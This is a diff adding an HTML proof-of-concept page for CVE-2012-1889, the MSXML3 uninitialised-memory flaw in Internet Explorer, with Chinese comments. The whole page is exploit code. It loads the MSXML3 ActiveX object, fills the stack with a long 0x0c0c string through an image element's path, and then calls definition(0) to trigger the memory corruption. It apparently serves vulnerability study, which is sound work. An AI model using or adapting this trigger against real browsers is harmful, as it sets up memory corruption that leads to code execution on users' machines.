@@ -1,0 +1,20 @@
+<html>
+<head>
+    <title>CVE 2012-1889 PoC</title>
+</head>
+<body>
+        //"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4"是MSXML3.dll中使用到的ID
+    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='poc'></object>
+    <script>
+        var obj = document.getElementById('poc').object;//获取obj对象，类id为"msxml3"，对象id为"poc"
+        var src = unescape("%u0c0c%u0c0c");             //0c0c
+        while (src.length < 0x1002) src += src;         //循环拼接路径
+        src = "\\\\xxx" + src;                          //拼接路径
+        src = src.substr(0, 0x1000 - 10);				//截断最后10字符
+        var pic = document.createElement("img");        //创建图片元素pic
+        pic.src = src;                                  //图片元素pic的路径赋值，路径是0xFF6字节的0c0c0c0c，将会溢出栈空间
+        pic.nameProp;
+        obj.definition(0);                              //定义并初始化一个空的对象
+    </script>
+</body>
+</html>
